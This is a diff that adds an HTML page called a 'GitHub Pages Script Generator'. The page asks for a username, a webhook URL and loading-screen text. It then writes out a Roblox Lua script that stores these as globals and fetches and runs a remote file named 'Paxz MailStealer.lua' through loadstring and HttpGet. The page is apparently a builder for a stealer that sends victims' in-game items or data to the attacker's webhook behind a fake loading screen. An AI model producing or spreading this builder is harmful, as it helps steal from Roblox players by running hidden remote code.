@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>GitHub Pages Script Generator</title>
+  </head>
+  <body>
+    <h1>GitHub Pages Script Generator</h1>
+    <form>
+      <label for="username">Username:</label><br>
+      <input type="text" id="username" name="username"><br>
+      <label for="webhook">Webhook:</label><br>
+      <input type="text" id="webhook" name="webhook"><br>
+      <label for="loadingText">LoadingText:</label><br>
+      <input type="text" id="loadingText" name="loadingText"><br>
+      <label for="output">Script Output:</label><br>
+      <textarea id="output" rows="10" cols="50"></textarea><br>
+      <input type="button" value="Generate Script" onclick="generateScript();">
+    </form>
+
+    <script>
+      function generateScript() {
+        var username = document.getElementById("username").value;
+        var webhook = document.getElementById("webhook").value;
+        var loadingText = document.getElementById("loadingText").value;
+
+        var script = '_G.UserName = "' + username + '"\n';
+        script += '_G.Webhook = "' + webhook + '"\n';
+        script += '_G.loadingScreenText = "' + loadingText + '"\n\n';
+        script += 'loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua"))()';
+
+        document.getElementById("output").value = script;
+      }
+    </script>
+  </body>
+</html>
